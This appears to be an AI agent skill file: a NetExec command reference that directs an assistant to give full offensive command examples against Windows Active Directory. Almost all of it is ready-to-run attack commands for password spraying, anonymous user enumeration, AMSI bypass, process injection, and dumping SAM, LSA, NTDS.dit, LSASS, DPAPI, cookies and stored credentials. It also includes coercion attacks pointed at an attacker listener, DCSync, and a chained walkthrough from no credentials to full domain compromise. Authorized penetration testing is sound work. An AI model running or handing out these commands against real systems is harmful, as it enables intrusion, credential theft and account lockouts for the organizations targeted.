---
name: offensive-netexec
description: >
  Use this skill whenever the user asks about NetExec (nxc) — a network
  exploitation and post-exploitation tool for Active Directory environments.
  Triggers include: any mention of 'nxc', 'netexec', 'crackmapexec' successor
  questions, AD enumeration, SMB/LDAP/WinRM/MSSQL/SSH/RDP/VNC/WMI/FTP/NFS
  protocol attacks, password spraying, credential dumping (SAM, NTDS, LSASS,
  DPAPI), Kerberoasting, ASREPRoasting, lateral movement, BloodHound collection,
  module usage, or any pentest workflow involving Windows domain environments.
  This skill covers ALL protocols, ALL modules, and ALL core features of NetExec.
  Always provide full command examples with correct flags and options.
---

# NetExec (nxc) — Reference Skill

## Global Syntax & Options

```
nxc <protocol> <target(s)> [auth options] [action options] [global options]
```

### Available Protocols
`smb` `ssh` `ldap` `ftp` `wmi` `winrm` `rdp` `vnc` `mssql` `nfs`

### Target Formats
```bash
nxc smb 192.168.1.0/24          # CIDR
nxc smb 192.168.1.1 192.168.1.2 # Multiple IPs
nxc smb 192.168.1.1-28          # IP range
nxc smb dc01.corp.local         # Hostname
nxc smb ~/targets.txt           # File
```

### Global Flags
| Flag | Description |
|------|-------------|
| `-t THREADS` | Concurrent threads (default: 100) |
| `--timeout TIMEOUT` | Per-thread timeout in seconds |
| `--jitter INTERVAL` | Random delay between connections (e.g. `3`, `2-5`, `4-4`) |
| `--no-progress` | Suppress progress bar |
| `--verbose` | Verbose output |
| `--debug` | Debug-level output |

---

## Authentication

### Core Auth Flags
```bash
-u USERNAME          # Single username
-u user1 user2       # Multiple usernames
-u ~/users.txt       # Username file

-p PASSWORD          # Plaintext password
-p 'P@ss!'           # Always quote special chars
-p='-P@ss'           # Use = for passwords starting with -

-H 'NTHASH'          # NT hash only
-H 'LM:NT'           # Full NTLM hash
-H 'aad3b435b51404eeaad3b435b51404ee:NTHASH'

-id <cred_id>        # Use credential from nxcdb

--local-auth         # Authenticate as local user (not domain)
```

### Domain Auth (SMB example)
```bash
nxc smb 192.168.1.0/24 -u Administrator -p 'Password123'
nxc smb 192.168.1.0/24 -u Administrator -H 'aad3b435b51404eeaad3b435b51404ee:NTHASH'
```

### Local Auth
```bash
nxc smb 192.168.1.0/24 -u localadmin -p 'Password123' --local-auth
```

### Kerberos Auth
```bash
# Auto-handle TGT using password
nxc smb dc01.corp.local -u user -p pass -k

# Use existing ccache ticket
export KRB5CCNAME=/path/to/ticket.ccache
nxc smb dc01.corp.local --use-kcache

# Specify KDC explicitly
nxc ldap dc01.corp.local -u user -p pass -k --kdcHost dc01.corp.local
```

### Multi-Domain Environments
```bash
# users.txt format:
# DOMAIN1\user1
# DOMAIN2\user2
nxc smb <target> -u users.txt -p 'Password123'
```

### Output Color Codes
- **RED** — Authentication failed
- **GREEN** — Authentication succeeded
- **MAGENTA** — Password valid but account is not admin
- **`(Pwn3d!)`** — Admin access / code execution available

### Pwn3d! Meaning by Protocol
| Protocol | Pwn3d! Meaning |
|----------|---------------|
| SMB | Local/domain admin access |
| WMI | Local admin |
| WinRM | Code execution |
| RDP | Code execution |
| VNC | Code execution |
| LDAP | Path to Domain Admin |
| SSH | Root access |
| FTP | No check |

---

## Password Spraying & Brute Force

```bash
# Spray one password across many users
nxc smb <target> -u ~/users.txt -p 'Summer2024!' --no-bruteforce --continue-on-success

# Brute force (user × pass combinations)
nxc smb <target> -u ~/users.txt -p ~/passwords.txt

# Hash spraying
nxc smb <target> -u ~/users.txt -H ~/hashes.txt --no-bruteforce

# Throttle to avoid lockouts
nxc smb <target> -u ~/users.txt -p 'Pass123' --jitter 3
nxc smb <target> -u ~/users.txt -p 'Pass123' --jitter 2-5

# IMPORTANT: --no-bruteforce pairs user[0]:pass[0], user[1]:pass[1], etc.
# Without it: every user × every password (full bruteforce)

# Keep going after first valid credential found
nxc smb <target> -u ~/users.txt -p 'Password' --continue-on-success
```

> ⚠️ **OpSec**: Jitter works per-host. Spraying against multiple hosts
> multiplies authentication attempts. Monitor domain lockout policy before
> spraying (use `--pass-pol` first).

---

## SMB Protocol

### Network Discovery
```bash
# Map live hosts — get OS, hostname, domain, signing, SMBv1
nxc smb 192.168.1.0/24

# Expected output:
# SMB  192.168.1.101  445  DC2016A  [*] Windows Server 2016 x64 (name:DC2016A) (domain:CORP) (signing:True) (SMBv1:False)
```

### Enumeration
```bash
# Shares and access
nxc smb <ip> -u user -p pass --shares

# Null session share enum
nxc smb <ip> -u '' -p '' --shares

# Guest logon check
nxc smb <ip> -u 'a' -p ''
nxc smb <ip> -u 'a' -p '' --shares

# Domain users
nxc smb <ip> -u user -p pass --users
nxc smb <ip> -u user -p pass --users-export output.txt

# Enumerate users by bruteforcing RIDs (no domain creds needed)
nxc smb <ip> -u '' -p '' --rid-brute
nxc smb <ip> -u '' -p '' --rid-brute 10000   # Set max RID

# Password policy (check before spraying!)
nxc smb <ip> -u user -p pass --pass-pol

# Logged-on users (requires admin)
nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users
nxc smb 192.168.1.0/24 -u user -p pass --loggedon-users targetuser

# Active Windows sessions (registry-based, no admin needed)
nxc smb <target>/24 -u user -p pass --reg-sessions
nxc smb <target>/24 -u user -p pass --reg-sessions 'admin_user'
nxc smb <target>/24 -u user -p pass --reg-sessions './users.txt'

# Active sessions via QWINSTA (admin required)
nxc smb 192.168.1.0/24 -u user -p pass --qwinsta
nxc smb 192.168.1.0/24 -u user -p pass --qwinsta targetuser

# Local groups
nxc smb 192.168.1.0/24 -u user -p pass --local-group

# Disks
nxc smb 192.168.1.0/24 -u user -p pass --disks

# Network interfaces (admin required)
nxc smb <ip> -u user -p pass --interfaces

# Null sessions
nxc smb <ip> -u '' -p ''

# SMB signing not required (relay attack candidates)
nxc smb 192.168.1.0/24 --gen-relay-list relay_targets.txt

# Check for NTLMv1 (via remote registry, admin required)
nxc smb <ip> -u user -p pass -M ntlmv1

# Enumerate AV/EDR (no admin needed)
nxc smb <ip> -u user -p pass -M enum_av

# Enumerate BitLocker status
nxc smb <ip> -u user -p pass -M bitlocker

# Enumerate remote processes (admin required)
nxc smb <ip> -u user -p pass --remote-processes

# Check for lockscreen backdoors (admin required)
nxc smb <ip> -u Administrator -p 'PASSWORD' -M lockscreendoors
```

### Spidering Shares
```bash
# Spider specific share for file pattern
nxc smb <ip> -u user -p pass --spider C\$ --pattern txt

# Spider all readable shares (list only)
nxc smb <ip> -u user -p pass -M spider_plus

# Spider and download all files
nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True

# Filter by content/regex
nxc smb <ip> -u user -p pass -M spider_plus -o PATTERN='password'
```

### File Operations
```bash
# Get a file
nxc smb <ip> -u user -p pass --get-file /remote/path/file.txt /local/path/file.txt

# Put a file
nxc smb <ip> -u user -p pass --put-file /local/file.txt /remote/path/file.txt
```

### Command Execution
Requires admin/Pwn3d! access.

```bash
# Execute cmd command (-x)
nxc smb <ip> -u Administrator -p 'Pass' -x whoami

# Execute PowerShell command (-X)
nxc smb <ip> -u Administrator -p 'Pass' -X '$PSVersionTable'

# Force specific execution method
nxc smb <ip> -u user -p pass -x whoami --exec-method wmiexec
nxc smb <ip> -u user -p pass -x whoami --exec-method atexec
nxc smb <ip> -u user -p pass -x whoami --exec-method smbexec

# Bypass AMSI for PowerShell
nxc smb <ip> -u user -p pass -X 'Get-Process' --amsi-bypass /path/to/payload

# Process Injection — run as another user's process (SYSTEM needed)
nxc smb <ip> -u user -p pass -M pi -o PID=<target_pid> EXEC=whoami
```

**Execution method order (automatic fallback):** wmiexec → atexec → smbexec

### Credential Dumping via SMB
All methods below require local admin unless noted.

```bash
# SAM hashes (local accounts)
nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --sam
nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --sam secdump  # fallback method

# LSA secrets (requires Domain Admin or Local Admin on DC)
nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --lsa
nxc smb 192.168.1.0/24 -u Administrator -p 'Pass' --lsa secdump

# NTDS.dit — full AD hash dump (requires Domain Admin)
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --enabled   # active accounts only
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds vss         # VSS method
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --user Administrator
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' --ntds --user NETBIOS/Administrator  # multi-domain

# NTDS via ntdsutil module
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' -M ntdsutil

# NTDS via raw disk access
nxc smb 192.168.1.100 -u DomainAdmin -p 'Pass' -M ntds-dump-raw -o TARGET=NTDS

# LSASS dump
nxc smb <ip> -u Administrator -p 'Pass' -M lsassy
nxc smb <ip> -u Administrator -p 'Pass' -M nanodump
nxc smb <ip> -u Administrator -p 'Pass' -M mimikatz  # deprecated

# DPAPI — browser creds, Credential Manager
nxc smb <ip> -u user -p pass --dpapi
nxc smb <ip> -u user -p pass --dpapi cookies       # include browser cookies
nxc smb <ip> -u user -p pass --dpapi nosystem      # skip system creds (stealth)
nxc smb <ip> -u user -p pass --local-auth --dpapi nosystem

# Azure/M365 token cache (WAM)
nxc smb <ip> -u user -p pass -M wam
nxc smb <ip> -u user -p pass -M wam --mkfile masterkeys.txt
nxc smb <ip> -u user -p pass -M wam --pvk domain_backup_key.pvk

# BackupOperator privilege abuse (no local admin needed if SeBackupPrivilege)
nxc smb <ip> -u user -p pass -M backup_operator

# SCCM credentials
nxc smb <ip> -u user -p pass --sccm
nxc smb <ip> -u user -p pass --sccm disk
nxc smb <ip> -u user -p pass --sccm wmi

# Credential manager applications
nxc smb <ip> -u user -p pass -M keepass_discover
nxc smb <ip> -u user -p pass -M keepass_trigger -o KEEPASS_CONFIG_PATH="/path/from/discovery"
nxc smb <ip> -u user -p pass -M veeam
nxc smb <ip> -u user -p pass -M wifi
nxc smb <ip> -u user -p pass -M winscp
nxc smb <ip> -u user -p pass -M vnc
nxc smb <ip> -u user -p pass -M mremoteng
nxc smb <ip> -u user -p pass -M rdcman
nxc smb <ip> -u user -p pass -M putty

# Notepad / Notepad++ unsaved documents
nxc smb <ip> -u user -p pass -M notepad
nxc smb <ip> -u user -p pass -M notepad++
```

### Vulnerability Scanning
```bash
# ZeroLogon (CVE-2020-1472)
nxc smb <ip> -u '' -p '' -M zerologon

# noPAC / Sam-The-Admin (needs creds)
nxc smb <ip> -u user -p pass -M nopac

# PrintNightmare
nxc smb <ip> -u '' -p '' -M printnightmare

# SMBGhost (CVE-2020-0796)
nxc smb <ip> -u '' -p '' -M smbghost

# EternalBlue MS17-010
nxc smb <ip> -u '' -p '' -M ms17-010

# NTLM Reflection (CVE-2025-33073) — needs creds
nxc smb <ip> -u user -p pass -M ntlm_reflection

# Coercion vulns (PetitPotam, DFSCoerce, PrinterBug, MSEven, ShadowCoerce)
nxc smb <ip> -u '' -p '' -M coerce_plus
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP>
nxc smb <ip> -u '' -p '' -M coerce_plus -o LISTENER=<AttackerIP> ALWAYS=true
nxc smb <ip> -u '' -p '' -M coerce_plus -o METHOD=PetitPotam   # or pe, dfs, pr

# Run multiple vuln checks at once
nxc smb <ip> -u '' -p '' -M zerologon -M printnightmare -M smbghost
```

### LAPS
```bash
# Read LAPS password (if you have a user with ReadLAPSPassword rights)
nxc smb <ip> -u laps-reader -p pass --laps
nxc smb <ip> -u laps-reader -p pass --laps customadminname  # non-default admin name
```

### Delegation Abuse
```bash
# RBCD — impersonate any user if msDS-AllowedToActOnBehalfOfOtherIdentity is set
nxc smb <ip> -u jon.snow -p iknownothing --delegate Administrator

# S4U2Self — with computer account nearly always gets local admin
nxc smb <ip> -u 'COMPUTER$' -H <nthash> --delegate Administrator --self
```

### Miscellaneous SMB
```bash
# Impersonate logged-on users
nxc smb <ip> -u user -p pass -M schtask_as -o USER=targetuser CMD=whoami

# Change user password
nxc smb <ip> -u user -p pass --change-password newpassword

# Modify group membership
nxc smb <ip> -u admin -p pass --modify-group "Domain Admins" --add-user victimuser

# Dump Teams cookies
nxc smb <ip> -u user -p pass -M teams_localdb

# Steal Teams cookies
nxc smb <ip> -u user -p pass -M steal_teams_cookies

# Check spooler / WebDAV running
nxc smb <ip> -u user -p pass -M spooler
nxc smb <ip> -u user -p pass -M webdav

# Defeating LAPS — read password if privileged
nxc smb <ip> -u privilegeduser -p pass --laps
```

---

## LDAP Protocol

### Authentication / Basic
```bash
nxc ldap <ip> -u user -p pass
nxc ldap <ip> -u user -p pass -k                        # Kerberos
nxc ldap <ip> -u user -p pass -k --kdcHost dc01.corp.local
```

### User Enumeration
```bash
nxc ldap <ip> -u user -p pass --users
nxc ldap <ip> -u user -p pass --users-export output.txt
nxc ldap <ip> -u user -p pass --active-users            # Active (non-disabled) users only
nxc ldap <ip> -u user -p pass --get-user-descriptions   # Users with descriptions
nxc ldap <ip> -u user -p pass --admin-count            # Users with adminCount=1
```

### Group Enumeration
```bash
nxc ldap <ip> -u user -p pass --groups
nxc ldap <ip> -u user -p pass --group-members "Domain Admins"
```

### Domain Info
```bash
nxc ldap <ip> -u user -p pass --dc-list          # Domain Controllers
nxc ldap <ip> -u user -p pass --find-domain-sid  # Domain SID
nxc ldap <ip> -u user -p pass --trusts           # Domain trusts
nxc ldap <ip> -u user -p pass --machine-account-quota  # MAQ value
nxc ldap <ip> -u user -p pass --get-scriptpath   # GPO script paths
nxc ldap <ip> -u user -p pass --extract-subnet   # Subnets from AD Sites
nxc ldap <ip> -u user -p pass --check-ldap-signing  # LDAP signing config
```

### Kerberos Attacks
```bash
# ASREPRoast — no auth needed if you have usernames
nxc ldap <ip> -u '' -p '' --asreproast output.txt       # anonymous (if allowed)
nxc ldap <ip> -u users.txt -p '' --asreproast output.txt
nxc ldap <ip> -u user -p pass --asreproast output.txt   # authenticated (finds all)
nxc ldap <ip> -u user -p pass --asreproast output.txt --kdcHost dc01.corp.local

# Crack with hashcat
hashcat -m18200 output.txt wordlist.txt

# Kerberoasting
nxc ldap <ip> -u user -p pass --kerberoasting output.txt

# Targeted Kerberoasting (requires WriteProperty on servicePrincipalName)
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast victim1
nxc ldap <ip> -u user -p pass --kerberoasting output.txt --targeted-kerberoast users.list

# Kerberoasting via AS-REP roastable account
nxc ldap <ip> -u asrep_user -p '' --no-preauth-targets kerberoastable.list --kerberoasting out.txt

# Crack with hashcat
hashcat -m13100 output.txt wordlist.txt

# Pre2k Computer Account Abuse
nxc ldap <ip> -u user -p pass -M pre2k
# Tickets saved to ~/.nxc/modules/pre2k/ccache/
```

### Privilege Escalation & Delegation
```bash
# Find all misconfigured delegations (Unconstrained, Constrained, RBCD)
nxc ldap <ip> -u user -p pass --find-delegation

# Unconstrained delegation accounts
nxc ldap <ip> -u user -p pass --unconstrained-delegation
```

### ACL / DACL Analysis
```bash
# Read all ACEs on a target object
nxc ldap dc.lab.local -k --kdcHost dc.lab.local -M daclread -o TARGET=Administrator ACTION=read

# Check what rights a specific principal has on a target
nxc ldap dc.lab.local -k -M daclread -o TARGET=Administrator ACTION=read PRINCIPAL=BlWasp

# Find who has DCSync rights
nxc ldap dc.lab.local -k -M daclread -o TARGET_DN="DC=lab,DC=LOCAL" ACTION=read RIGHTS=DCSync

# Check for DENY ACEs
nxc ldap dc.lab.local -k -M daclread -o TARGET=Administrator ACTION=read ACE_TYPE=denied

# Backup DACLs for multiple targets
nxc ldap dc.lab.local -k -M daclread -o TARGET=../../targets.txt ACTION=backup
```

### Credential & Secret Extraction
```bash
# Dump gMSA passwords (requires right; uses LDAPS automatically)
nxc ldap <ip> -u user -p pass --gmsa

# Extract gMSA secrets
nxc ldap <ip> -u user -p pass -M get-gmsa-creds

# Read DACL rights on gMSA
nxc ldap <ip> -u user -p pass --gmsa-convert-id <ID>
```

### BloodHound Data Collection
```bash
nxc ldap <ip> -u user -p pass --bloodhound --collection All
nxc ldap <ip> -u user -p pass --bloodhound --collection DCOnly
nxc ldap <ip> -u user -p pass --bloodhound --collection Session,LoggedOn
```

### SCCM / Entra ID / DNS
```bash
# SCCM enumeration
nxc ldap <ip> -u user -p pass -M enum-sccm

# Entra ID enumeration
nxc ldap <ip> -u user -p pass --entra-id

# Unsecured DNS zones
nxc ldap <ip> -u user -p pass --enumerate-unsecure-dns-zones

# Custom LDAP query
nxc ldap <ip> -u user -p pass --query "(objectClass=user)" "sAMAccountName"
```

### raisechild — Domain Trust Escalation
```bash
nxc ldap <ip> -u user -p pass -M raisechild
```

---

## WinRM Protocol

```bash
# Check auth
nxc winrm <ip> -u user -p pass

# Execute command
nxc winrm <ip> -u user -p pass -X whoami

# Credential dumping (admin required)
nxc winrm <ip> -u user -p pass --sam
nxc winrm <ip> -u user -p pass --lsa
nxc winrm <ip> -u user -p pass --dpapi   # no admin needed — dumps current user creds
```

> **Pwn3d!** on WinRM = code execution is possible. Use `evil-winrm` for
> interactive shell: `evil-winrm -i <ip> -u user -p pass`

---

## WMI Protocol

```bash
# Auth check
nxc wmi <ip> -u user -p pass

# Password spray
nxc wmi <ip> -u ~/users.txt -p ~/passwords.txt

# Execute command
nxc wmi <ip> -u user -p pass -x whoami
```

---

## MSSQL Protocol

```bash
# Auth check (domain)
nxc mssql <ip> -u user -p pass

# Auth check (local SQL account)
nxc mssql <ip> -u sa -p 'P@ssw0rd' --local-auth

# Run SQL query
nxc mssql <ip> -u admin -p pass --local-auth -q 'SELECT name FROM master.dbo.sysdatabases;'

# OS command via xp_cmdshell (requires sysadmin)
nxc mssql <ip> -u sa -p pass -x whoami

# Password spray
nxc mssql <ip> -u ~/users.txt -p ~/passwords.txt --no-bruteforce

# Privilege escalation — check for impersonation rights
nxc mssql <ip> -u user -p pass -M mssql_priv

# Escalate to sysadmin
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=privesc

# Rollback (after engagement)
nxc mssql <ip> -u user -p pass -M mssql_priv -o ACTION=rollback

# Enumerate users by RID brute
nxc mssql <ip> -u user -p pass --rid-brute

# Linked servers
nxc mssql <ip> -u user -p pass --mssql-linked-servers

# Upload/download files
nxc mssql <ip> -u user -p pass --put-file /local/file.txt C:\\remote\\file.txt
nxc mssql <ip> -u user -p pass --get-file C:\\remote\\file.txt /local/file.txt
```

---

## SSH Protocol

```bash
# Auth check
nxc ssh <ip> -u user -p pass
nxc ssh <ip> -u root -p pass         # Pwn3d! if root

# Password spray
nxc ssh 10.10.10.0/24 -u ~/users.txt -p ~/passwords.txt

# Execute command
nxc ssh <ip> -u user -p pass -x whoami

# File transfer
nxc ssh <ip> -u user -p pass --get-file /remote/file /local/file
nxc ssh <ip> -u user -p pass --put-file /local/file /remote/path/file
```

---

## RDP Protocol

```bash
# Auth check / password spray
nxc rdp <ip> -u user -p pass
nxc rdp 192.168.1.0/24 -u ~/users.txt -p ~/passwords.txt

# Screenshot without NLA (unauthenticated)
nxc rdp <ip> -u '' -p '' --screenshot --screentime 5

# Screenshot with auth
nxc rdp <ip> -u user -p pass --screenshot

# Execute command
nxc rdp <ip> -u user -p pass -x whoami
```

---

## VNC Protocol

```bash
# Auth check
nxc vnc <ip> -u user -p pass

# Screenshot
nxc vnc <ip> --screenshot
```

---

## FTP Protocol

```bash
# Auth check / spray
nxc ftp <ip> -u user -p pass
nxc ftp <ip> -u ~/users.txt -p ~/passwords.txt

# List files
nxc ftp <ip> -u user -p pass --ls

# Download / upload
nxc ftp <ip> -u user -p pass --get-file /remote/file.txt /local/file.txt
nxc ftp <ip> -u user -p pass --put-file /local/file.txt /remote/file.txt
```

---

## NFS Protocol

```bash
# Enumerate exports
nxc nfs <ip>
nxc nfs <ip> -u user -p pass --enum-shares

# Download / upload
nxc nfs <ip> --get-file /remote/path/file.txt /local/file.txt
nxc nfs <ip> --put-file /local/file.txt /remote/path/

# chmod on remote file
nxc nfs <ip> -u user -p pass --chmod 777 /remote/file.txt

# Escape to root filesystem
nxc nfs <ip> -u user -p pass --chroot
```

---

## Modules System

```bash
# List all modules for a protocol
nxc smb -L
nxc ldap -L
nxc winrm -L

# View module options
nxc smb -M lsassy --options

# Run a module
nxc smb <ip> -u user -p pass -M lsassy

# Run with options
nxc smb <ip> -u user -p pass -M spider_plus -o DOWNLOAD_FLAG=True

# Run MULTIPLE modules at once (v1.1+)
nxc smb <ip> -u user -p pass -M spooler -M iis -M lsassy -M winscp
```

---

## Logging & Audit Mode

```bash
# Log all results to file
nxc smb <target> -u user -p pass --log results.txt

# Audit mode — redact creds from console (configure in ~/.nxc/nxc.conf)
# Set: audit_mode = *   (or any character to use as redaction mask)
```

## Pentest Scenario Example (Chained Workflows)

### Initial Recon (No Creds)
```bash
# 1. Discover live hosts and SMB info
nxc smb 192.168.1.0/24

# 2. Find hosts without SMB signing (relay targets)
nxc smb 192.168.1.0/24 --gen-relay-list relay.txt

# 3. Check null session / guest logon
nxc smb 192.168.1.0/24 -u '' -p ''
nxc smb 192.168.1.0/24 -u 'a' -p ''

# 4. Enumerate shares with null session
nxc smb 192.168.1.0/24 -u '' -p '' --shares

# 5. ASREPRoast with username wordlist
nxc ldap <dc_ip> -u users.txt -p '' --asreproast asrep.txt
hashcat -m18200 asrep.txt /usr/share/wordlists/rockyou.txt
```

### With Domain Creds (Low Privilege)
```bash
# 1. Collect BloodHound data
nxc ldap <dc_ip> -u user -p pass --bloodhound --collection All

# 2. Get password policy
nxc smb <dc_ip> -u user -p pass --pass-pol

# 3. Enumerate all users
nxc ldap <dc_ip> -u user -p pass --users-export users.txt

# 4. Kerberoast
nxc ldap <dc_ip> -u user -p pass --kerberoasting kerberoast.txt
hashcat -m13100 kerberoast.txt /usr/share/wordlists/rockyou.txt

# 5. Find delegation misconfigs
nxc ldap <dc_ip> -u user -p pass --find-delegation

# 6. Check DACL rights on Domain Admins
nxc ldap <dc_ip> -k -M daclread -o TARGET="Domain Admins" ACTION=read

# 7. Scan for vulns
nxc smb 192.168.1.0/24 -u user -p pass -M zerologon -M nopac -M coerce_plus
```

### With Local Admin (Lateral Movement)
```bash
# 1. Dump SAM / LSA on target
nxc smb <ip> -u localadmin -p pass --local-auth --sam
nxc smb <ip> -u localadmin -p pass --local-auth --lsa

# 2. Dump LSASS (get domain creds)
nxc smb <ip> -u localadmin -p pass --local-auth -M lsassy

# 3. Spray dumped hashes across subnet
nxc smb 192.168.1.0/24 -u Administrator -H <NTHASH> --local-auth

# 4. Spider shares for sensitive files
nxc smb 192.168.1.0/24 -u user -p pass -M spider_plus
```

### With Domain Admin
```bash
# 1. Dump NTDS.dit
nxc smb <dc_ip> -u DomainAdmin -p 'Pass' --ntds

# 2. DCSync specific user
nxc smb <dc_ip> -u DomainAdmin -p 'Pass' -M mimikatz -o COMMAND='"lsadump::dcsync /domain:corp.local /user:krbtgt"'

# 3. Dump all DPAPI secrets at scale
nxc smb 192.168.1.0/24 -u DomainAdmin -p 'Pass' --dpapi nosystem
```

---

## Quick Reference: Flag Cheatsheet

| Flag | Purpose |
|------|---------|
| `-u` | Username(s) or file |
| `-p` | Password(s) or file |
| `-H` | NTLM hash |
| `-k` | Kerberos auth |
| `--use-kcache` | Use KRB5CCNAME ticket |
| `--local-auth` | Local user (not domain) |
| `--id` | Use cred ID from DB |
| `-x` | Run CMD command |
| `-X` | Run PowerShell command |
| `--exec-method` | Force wmiexec/atexec/smbexec |
| `-M` | Module name (repeatable) |
| `-o` | Module options KEY=value |
| `-L` | List available modules |
| `--sam` | Dump SAM hashes |
| `--lsa` | Dump LSA secrets |
| `--ntds` | Dump NTDS.dit |
| `--dpapi` | Dump DPAPI secrets |
| `--shares` | Enumerate SMB shares |
| `--users` | Enumerate users |
| `--pass-pol` | Get domain password policy |
| `--loggedon-users` | List logged-on users |
| `--spider` | Spider a share |
| `--laps` | Read LAPS password |
| `--asreproast` | ASREPRoast to file |
| `--kerberoasting` | Kerberoast to file |
| `--bloodhound` | Run BloodHound collector |
| `--find-delegation` | Find delegation misconfigs |
| `--no-bruteforce` | Pair user[i]:pass[i] mode |
| `--continue-on-success` | Don't stop at first valid |
| `--jitter` | Delay between requests |
| `--gen-relay-list` | Output relay-able hosts |
| `--delegate` | RBCD/S4U2Self impersonation |
| `--gmsa` | Dump gMSA passwords |
| `--ignore-opsec-warnings` | Suppress opsec warnings |
